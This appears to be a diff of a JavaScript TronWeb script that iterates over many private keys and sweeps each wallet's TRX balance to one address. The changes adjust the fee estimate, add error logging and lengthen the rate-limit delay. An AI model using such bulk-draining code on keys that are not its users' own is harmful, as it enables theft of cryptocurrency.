@@ -24,7 +24,6 @@ let tronWeb = new TronWeb({
 });
 
 function switchRPC() {
-
   currentRPC++;
 
   if (currentRPC >= RPC_LIST.length) {
@@ -36,7 +35,6 @@ function switchRPC() {
   tronWeb = new TronWeb({
     fullHost: RPC_LIST[currentRPC]
   });
-
 }
 
 //////////////////////////////////////////////////////
@@ -141,7 +139,8 @@ async function sendTransaction(privateKey, toAddress) {
 
     }
 
-    const estimatedFee = 100000; // 0.1 TRX
+    // Estimasi fee yang lebih tinggi (1 TRX)
+    const estimatedFee = 1000000; // 1 TRX
 
     let amount = balance - estimatedFee;
 
@@ -162,6 +161,8 @@ async function sendTransaction(privateKey, toAddress) {
 
     const result = await tronWeb.trx.sendRawTransaction(signed);
 
+    console.log("Response RPC:", result);
+
     if (result.result) {
 
       console.log("✅ Berhasil kirim");
@@ -169,7 +170,7 @@ async function sendTransaction(privateKey, toAddress) {
 
     } else {
 
-      console.log("❌ Transaksi gagal:", result);
+      console.log("❌ Transaksi gagal");
 
     }
 
@@ -177,7 +178,13 @@ async function sendTransaction(privateKey, toAddress) {
 
   } catch (err) {
 
-    console.log("Error transaksi:", err.message);
+    console.log("Error transaksi:");
+
+    if (err.response) {
+      console.log(err.response.data);
+    } else {
+      console.log(err);
+    }
 
     switchRPC();
 
@@ -240,7 +247,7 @@ async function main() {
 
     await sendTransaction(privateKeys[i], toAddress);
 
-    await sleep(3000);
+    await sleep(5000);  // Delay 5 detik antar transaksi untuk menghindari rate limit
 
   }
 
